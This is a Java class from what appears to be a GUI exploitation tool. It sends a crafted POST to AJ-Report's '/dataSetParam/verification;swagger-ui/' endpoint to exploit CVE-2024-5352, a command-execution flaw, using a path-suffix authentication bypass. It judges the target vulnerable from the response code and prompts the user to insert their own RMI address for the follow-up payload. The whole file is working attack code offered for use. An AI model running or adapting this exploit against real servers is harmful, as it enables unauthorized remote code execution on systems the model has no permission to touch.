package com.liev.clouds.exp;

import com.liev.clouds.payload.AjReportPayload;
import com.liev.clouds.utils.DataUtils;
import com.liev.clouds.utils.HttpResponse;
import com.liev.clouds.utils.HttpUtils;
import javafx.scene.control.TextArea;

import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @author Revcloud
 * @since 2024/7/26 15:07
 */
public class AjReportExp {

    public void processDetection(String url, String postData, TextArea postTxt, TextArea outComeArea, TextArea responseArea) {
        // 这里可以添加实际的检测逻辑，当前仅为示例逻辑

        //TODO 调用所有方法


    }

    /**
     * CVE-2024-5352(任意命令执行)
     * @param url
     * @param postTxt
     * @param responseArea
     */
    public boolean processRce(String url, String postData, TextArea postTxt, TextArea outComeArea, TextArea responseArea){
        boolean exp = false;

        if (postData == null) {
            //TODO 多个exp检测

            postData = AjReportPayload.GORRVY_EXP;
        }
        String trueUrl = url + "/dataSetParam/verification;swagger-ui/";
        // 设置请求头
        Map<String, String> headers = new HashMap<>();
        headers.put("Content-Type", "application/json;charset=UTF-8");
        // 发送POST请求
        HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);


        String formattedResponseBody = response.getResponseBody();

        // 正则表达式模式
        String regex = "\"code\":\"(.*?)\"";

        // 创建 Pattern 对象
        Pattern pattern = Pattern.compile(regex);

        // 创建 matcher 对象
        Matcher matcher = pattern.matcher(formattedResponseBody);

        String dataValue = "";
        if (matcher.find()) {
            // 获取匹配的字符串
            dataValue = matcher.group(1);
        }

        String result;
        if (dataValue.equals("4005")) {
            result = "漏洞存在! \n请勾选自定义POST请求然后在POST请求中自定义您的rmi地址!";
            exp = true;
        } else {
            result = "漏洞不存在!";
        }
        String formattedPostData = DataUtils.formatJson(postData);
        postTxt.setText(formattedPostData);

        outComeArea.setText(result);


        // 获取并格式化所有响应头
        Map<String, String> responseHeaders = response.getResponseHeaders();
        StringBuilder headersStringBuilder = new StringBuilder();
        for (Map.Entry<String, String> entry : responseHeaders.entrySet()) {
            headersStringBuilder.append(entry.getKey()).append(": ").append(entry.getValue()).append("\n");
        }
        // 将响应头和响应体输出到customArea
        responseArea.setText(response.getResponseCode() + "\n" + headersStringBuilder.toString() + "\n" + formattedResponseBody);

        return exp;

    }

}
